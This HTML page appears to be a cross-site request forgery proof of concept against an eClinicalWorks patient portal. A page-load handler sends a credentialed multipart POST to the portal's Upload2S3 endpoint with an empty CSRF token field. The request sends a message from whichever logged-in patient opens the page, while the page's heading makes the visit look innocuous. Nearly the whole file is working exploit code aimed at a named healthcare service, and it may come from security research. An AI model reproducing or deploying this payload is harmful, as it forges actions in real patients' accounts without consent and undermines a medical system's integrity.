<html>
  <h2>Message Sent Check you SentBox</h2>
  <body>
  <body onload="document.createElement('form').submit.call(submitRequest())">
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/appsecpatientportal.eclinicalweb.com\/portal_trunk\/Upload2S3", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------3496858193464059613161008599");
        xhr.withCredentials = true;
        var body = "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"act\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"to\"\r\n" + 
          "\r\n" + 
          "9095\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"defProvider\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"facility\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"RequestMessage\"\r\n" + 
          "\r\n" + 
          "testing\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"StartBody\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"EndBody\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"todaysdate\"\r\n" + 
          "\r\n" + 
          "2020-8-20 9:28:49\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"param\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"hasAttachment\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"fileid\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"txtTo\"\r\n" + 
          "\r\n" + 
          "support eclinicalworks\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"per_pcp_display\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"pcp_lastname\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"txtSubject\"\r\n" + 
          "\r\n" + 
          "test4\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"message\"\r\n" + 
          "\r\n" + 
          "testing\r\n" + 
          "-----------------------------3496858193464059613161008599\r\n" + 
          "Content-Disposition: form-data; name=\"X-CSRF-TOKEN\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------3496858193464059613161008599--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
  </body>
</html>
